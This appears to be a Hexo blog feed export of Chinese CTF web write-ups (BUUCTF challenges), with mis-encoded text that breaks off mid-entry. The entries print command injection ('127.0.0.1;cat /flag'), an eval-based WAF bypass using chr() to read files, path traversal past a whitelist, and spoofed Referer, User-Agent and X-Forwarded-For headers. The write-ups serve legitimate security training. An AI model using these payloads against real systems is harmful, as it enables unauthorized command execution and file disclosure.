        <content type="html"><![CDATA[<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>ls<span class="token comment">//åªæœ‰ä¸€ä¸ªindex.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>ls <span class="token operator">/</span> è¿”å›ä¸Šä¸€çº§å‘ç°flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">æœ€ç»ˆpayload<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>cat <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF_2019 Easy Calc</title>
      <link href="/2021/03/01/roarctf-2019-easy-calc/"/>
      <url>/2021/03/01/roarctf-2019-easy-calc/</url>
      
        <content type="html"><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>æŸ¥çœ‹æºä»£ç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token constant">I</span>'ve <span class="token keyword">set</span> up <span class="token constant">WAF</span> to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div class="alert alert-success"&gt;            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token function-variable function">error</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¿™å•¥?ç®—ä¸æ¥!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›å…¥<code>calc.php</code>å¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨å¾ˆå¤šwafï¼Œevalæ‰§è¡Œå‡½æ•°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadcalc<span class="token operator">.</span>php<span class="token operator">?</span> num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//æ‰«æä¸Šçº§çš„æ–‡ä»¶</span>å‘ç°f1agg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadcalc<span class="token operator">.</span>php<span class="token operator">?</span> num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>å¾—åˆ°flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018 WarmUp</title>
      <link href="/2021/03/01/hctf-2018-warmup/"/>
      <url>/2021/03/01/hctf-2018-warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>è¿›å»åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºä»£ç   å‘ç°<!--source.php--></p><p>è¿›å…¥source.phpå¾—åˆ°å¦‚ä¸‹ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç å®¡è®¡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥ä¸€ä¸ªâ€™fileâ€™ï¼Œæ»¡è¶³ä¸ä¸ºç©ºï¼Œæ˜¯å­—ç¬¦ä¸²ï¼Œæ»¡è¶³checkFileå‡½æ•°ï¼Œå°±èƒ½è¢«åŒ…å«</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//ä¸ä¸ºç©ºï¼Œæ˜¯å­—ç¬¦ä¸²çš„é€šè¿‡</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//æ£€æŸ¥æ˜¯å¦åœ¨ç™½åå•</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token comment">//æ‰¾åˆ°ç¬¬ä¸€ä¸ª'?</span><span class="token string single-quoted-string">'çš„ç´¢å¼•            );//æˆªå–'</span><span class="token operator">?</span><span class="token string single-quoted-string">'å‰é¢çš„å­—ç¬¦            if (in_array($_page, $whitelist)) {//æ£€æŸ¥æˆªå–åæ˜¯å¦åœ¨ç™½åå•                return true;            }            $_page = urldecode($page);//urlè§£ç             $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '</span><span class="token operator">?</span><span class="token string single-quoted-string">', '</span><span class="token operator">?</span><span class="token string single-quoted-string">')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can'</span>t see it"<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æåå¾—åˆ°å‡½æ•°åŠŸèƒ½  åªéœ€è¦æ»¡è¶³ä¸€ä¸ªtureå°±èƒ½è¿›å…¥åŒ…å«æ–‡ä»¶</p><p>è¿›å…¥hint.php  å¾—åˆ°æç¤ºflag not here, and flag in ffffllllaaaagggg</p><p>çŒœæµ‹æ˜¯ç›®å½•éå†</p><p>è¿™é‡Œæ„é€ payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>source<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>hint<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaaggggæˆ–è€…<span class="token operator">/</span>source<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>hint<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">253</span>F<span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 Http</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-http/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-http/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>æ£€æŸ¥æºç ï¼Œå‘ç°<code>Secret.php</code></p><p>è¿›å…¥<code>Secret.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">It doesn<span class="token string single-quoted-string">'t come from '</span>https<span class="token punctuation">:</span><span class="token comment">//www.Sycsecret.com'æç¤º</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>burpæŠ“åŒ…ä¿®æ”¹Referer</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Referer<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token comment">//www.Sycsecret.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">æç¤ºPlease <span class="token keyword">use</span> <span class="token string double-quoted-string">"Syclover"</span> brows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹UA</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Syclover<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">æç¤ºNo<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span> you can only read this locally<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹XFF</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 Havefun</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>å®¡æŸ¥æºä»£ç å¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string single-quoted-string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Syc{cat_cat_cat_cat}'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥å‚æ•°=dog</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cat<span class="token operator">=</span>dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŠ¤ç½‘æ¯_2018 easy_tornado</title>
      <link href="/2021/03/01/hu-wang-bei-2018-easy-tornado/"/>
      <url>/2021/03/01/hu-wang-bei-2018-easy-tornado/</url>
      
        <content type="html"><![CDATA[<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>è¿›å…¥ä¸‰ä¸ªæ–‡ä»¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>flag<span class="token operator">.</span>txtflag in <span class="token operator">/</span>fllllllllllllagfile<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>flag<span class="token operator">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token number">9053</span>c61f6b76e014b1e003957ee5b546<span class="token operator">/</span>welcome<span class="token operator">.</span>txtrenderfile<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>welcome<span class="token operator">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token number">7</span>d2c2069a844d7a93c2d6ee197618bd6<span class="token operator">/</span>hints<span class="token operator">.</span>txt<span class="token function">md5</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span><span class="token function">md5</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>hints<span class="token operator">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>b01fb2c2497da3d0979b7965d57a95dc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çŒœæµ‹payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">?</span>filename<span class="token 